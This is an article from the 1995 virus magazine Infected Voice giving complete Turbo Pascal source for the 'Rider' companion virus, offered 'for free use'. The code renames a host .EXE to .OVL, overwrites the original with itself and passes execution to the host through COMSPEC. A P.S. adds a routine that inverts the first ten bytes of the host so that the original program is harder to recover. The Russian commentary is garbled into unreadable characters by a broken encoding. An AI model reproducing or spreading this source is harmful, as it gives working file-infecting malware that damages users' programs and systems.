{     ��                  �
    ���  Virus Magazine  � Box 10, Kiev 148, Ukraine       XII 1995
    ��� ���������������� � ������������������� � ��������  ��������
     �� ��� ��� ��� ��� ��� ��� ���    � � ��� � ��� ���   � ���� � 
      � � � ��  ��  �    �  ��  � �    � � � � � �   �     � ���� �
      � � � �   ��� ���  �  ��� ���     �� ��� � ��� ����  � ���� �
      � ����������������� �������������������������������  ��������
      (C) Copyright,1994-95,by STEALTH group WorldWide, unLtd.
} 
{ Name          Rider  }
{ Version       1.0    }
{ Stealth       No     }
{ Tsr           No     }
{ Danger        0      }
{ Attac speed   Slow   }
{ Effects       No     }
{ Length        4000   }
{ Language      Pascal }
{ BodyStatus    Packed }
{ Packer        Pklite }

(*                     Copyleft (cl) Dirty Nazi                           *)
                           { For free use }


{$M 2048 , 0 , 0}  { Stack 1024b , Low Heap Limit 0b , High Heap Limit 0b }
Uses Dos;
 Const
     Fail   =  'Cannot execute '#13#10'Disk is write-protected';
     Ovr    =  '.OWL';
     Ovl    =  '.OVL';                   { ����⠭�� }
     Exe    =  '.EXE';
 Var
   DirInfo     :   SearchRec;
   Sr          :   SearchRec;
   Ch          :   Char;                 { ��६���� }
   I           :   Byte;
   OurName     :   PathStr;
   OurProg     :   PathStr;
   Ren         :   File;
   CmdLine     :   ComStr;
   Victim      :   PathStr;
   VictimName  :   PathStr;

 procedure CheckRO;                      { ��楤�ઠ ��� �஢�ન }
  begin                                  { ��᪠ �� Read Only }

    Assign(Ren , #$FF);
    ReWrite(Ren);
    Erase(Ren);

    If IOResult <> 0 Then
      begin                              { �᫨ ��� �⠢�� Read Only, }
        WriteLn(Fail);                   { � �� �� ��� ⠪ �⢥砥� }
        Halt(5);  { Access denied }
      end;

  end;  { end proc }

 procedure ExecReal;                     { ��楤�� �ண���� �ਣ����� }
  begin
     FindFirst(OurName + Ovl , AnyFile , DirInfo); { ��室�� �ਣ���� }

      If DosError <> 0 Then            { �᫨ �� ��諨 }
        begin
            WriteLn('Virus RIDER. Let''s go on riding!');
            WriteLn('I beg your pardon, your infected file cannot be executed...');
            Halt(18);       { File not found }
        end;

     Assign(Ren , OurName + Exe);       { ��२�����뢠�� ���� �ணࠬ�� }
     ReName(Ren , OurName + Ovr);       { � .OWL }
     Assign(Ren , OurName + Ovl);       { � ��� "���૥�" � .EXE }
     ReName(Ren , OurName + Exe);

     SwapVectors;                       { � ����᪠�� ��� }
     Exec(GetEnv('COMSPEC') , '/C ' + OurName + Exe + CmdLine);
     SwapVectors;

     Assign(Ren , OurName + Exe);
     ReName(Ren , OurName + Ovl);       { � ⥯��� �����頥� �� �� ���� }
     Assign(Ren , OurName + Ovr);
     ReName(Ren , OurName + Exe);

  end;  { end proc }

 procedure Infect;        { � �� ���譠� ��楤�� -- ��楤�� ��ࠦ���� }
  begin

      Assign(Ren , Victim);
      ReName(Ren , VictimName + Ovl);     { ��२�����뢠�� ����� � .OVL }

      SwapVectors;            { �����㥬 ��� ⥫� �� ���� ����� }
      Exec(GetEnv('COMSPEC') , '/C COPY ' + OurProg + ' ' + Victim + ' >NUL');
      SwapVectors;
                                    { ��� � �� }
  end;  { end proc }

 procedure FindFile;                    { ��楤�� ���᪠ ����� }
  begin

      FindFirst('*.EXE' , AnyFile , DirInfo);   { � ⥪�饬 ��⠫��� }
                                                { �饬 .EXE 䠩� }
       If DosError = 0 Then                     { � �᫨ �� ��� ��諨 }
         begin
             Victim:=DirInfo.Name;           { ���������� ��� ����� }
             VictimName:=Copy(Victim , 1 , Length(Victim) - 4); { ������- }
                                     { ���� ��� ��� ���७�� }
             FindFirst(VictimName + Ovl , AnyFile , Sr); { �饬 ���૥� }
                                  { � ⥬ �� ������ }

              If DosError <> 0 Then Infect; { � �᫨ ���૥� ���, � }
                             { ᮢ��蠥� ����⢨�, ��������㥬� }
                             { �����᪨� ��� "�����" }

         end;

  end; { end proc }

  procedure Init;                 { ��楤�� ���樠����樨 ��६����� }
   begin

        CmdLine:='';              { ���������� ��ப� }

        OurProg:=ParamStr(0);     { ������ ��� ��襩 �ணࠬ�� }
        OurName:=Copy(ParamStr(0) , 1 , Length(ParamStr(0)) - 4); { ��� }
                                        { ��襩 �ணࠬ�� ��� ���७�� }
        For I:=1 To ParamCount Do
          begin
              CmdLine:=ParamStr(I) + ' ';  { ���������� ��ࠬ���� }
          end;

   end;  { end proc }

 begin  { * MAIN * }

     If False Then     { � ��� ⠡���� �� ��ᮢ뢠�� � ��� ��� ��, �� }
         begin         { �ᯠ��� ��� ����� � ��筥� � ��� �������� }
            WriteLn(#13#10);
            WriteLn(#13#10' ������������������������������������������������������������������ͻ   ');
            WriteLn(#13#10' � This is DEMO version of RIDER. Register to get legalized version ��� ');
            WriteLn(#13#10' ������������������������������������������������������������������͹�� ');
            WriteLn(#13#10' � Mr. Lozinsky! I"m just a little child! Please don"t kill me!     ��� ');
            WriteLn(#13#10' ������������������������������������������������������������������ͼ�� ');
            WriteLn(#13#10'   �������������������������������������������������������������������� '#13#10#13#10);
         end;

     Init;            { ���樠�����㥬�� }

     CheckRO;         { �஢�ઠ �� R/O ��᪠ }

     FindFile;        { �饬 � ��ࠦ��� }

     ExecReal;        { ����㦠�� ��� "���૥�" }

 end.   { * �� ��� � ��, � ��� ��� �������� * }

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

     ��� ��१������ .EXE-����� �� ���� �����䨪�樨 -- �祭�
�������, � �� �����䨪�樨 �������� ���� � �� ����, ���  ���
� 䠩�� VirList.Web ���⠫ ⠪�� ����:

ZzTop.340

     ����� १������ �����. � �����  ��� ���뢠����  *.C  � 
*.CPP-䠩��� �����뢠�� ��ப� "ZZ TOP".

� ��, ���ਬ��, ���� 㤨�����, ����� � ᥡ� � ����  *.C  䠩��
��� �ࠧ�, � ��� ����� ��������� ��⠥� �� �䨣����� �������-
��. �� �� �, �롮� ���!

(For dummies only: *.C-䠩�� -- �� ��室����, ��ᠭ� �� �몥 C
� �� ᠬ��, �� 䠩�� *.PAS, *.BAS, *.PRG, *.ASM etc.)

     � �����: ����� Rider ("����pi����" ��-��襬�) ����ᠭ �祭�
���� � ����㯭�. ����� �� ��室���. �� ᥠ�� ࠡ��� ��ࠦ�-
�� ���� *.EXE 䠩� � ⥪�饬 ��⠫���. *.COM - 䠩�� ��  ��ࠦ���
�� ��-�� ������������ �⮣�, � ��-�� ���� ����. �����, �  ᫥��-
��� ������... ��� ����� ��ࠦ���� ⮦� ���쬠  ����:  ���⢠
��२�����뢠���� � 䠩� � ���७��� .OVL (���૥� � ����),  �
�� ��� ���� � ������� ����������  ������ ��������� ������
���. �� ����᪥ �ந�������� ��ࠦ���� ᢥ������������ exe譨��,
��⥬ .OVL ��२�����뢠���� � .EXE, � ��� ��� � .OWL  � ����᪠-
���� �� �ᯮ������ �ਣ����. ����� �� �ਣ�����稪 ��ࠡ�⠫, �-
���蠥� ��२��������� �  ���⭮�  ���浪�.  �  Read-Only  ��᪠
�ணࠬ�� �� ������, � �뤠�� �२���᭥���� �������  �  ⮬,
�� �ணࠬ�� �� ����㧨���, ��� ��� is write-protected. ��� �-
��� ��� ����� ����ᠫ ��吝� �����. Have a nice die!

P.S. � �।�⠢������ ����� ���� ����� ����� �����।���, ����
     ��२������� .OVL 䠩� ���⭮ � .EXE. H� ����� �ᯮ�짮���� 
     ���⮩ �ਥ�, � �⮡� �������� �ਣ������� �ணࠬ��, 
     �ਤ����-⠪� ����᪠�� �����. ��� ��� �ਥ�:

 procedure MakeNot; 
  Var 
     Buf10 : Array [1..10] of Byte;
     Cicle : Byte;
     
  begin
       Seek(Prog , 0);
       Reset(Prog);
       BlockRead(Prog , Buf10 , 10);
       For Cicle:=1 To 10 Do Buf10[Cicle]:=Not Buf10[Cicle];
       Seek(Prog , 0);
       BlockWrite(Prog , Buf10 , 10);
       Close(Prog);
   end;

   �� �ᯮ�짮����� �⮩ ��楤��� ���� ���뢠��, �� ��ࠦ����� /
   ����᪠���� �� �ᯮ������ �ணࠬ�� ������ ���� �易�� � ���-
   ������ Prog ⨯� File, ���ᠭ��� � �᭮���� ���㫥. ���� ��楤�-
   �� ��⮨� � ⮬, �� �� ��ࠦ����� �ணࠬ�� ���뢠���� 10 ����
   � ��������� ����樥� Not. .EXE �ணࠬ�� �⠭������ ��ࠡ��-
   ᯮᮡ���. ���쪮 �� ������ ����᪠�� ��� ��楤��� ��। 
   �ண���� �ਣ�����, � ��᫥ �ண��� �� ࠧ. 


                                                  (cl) Dirty Nazi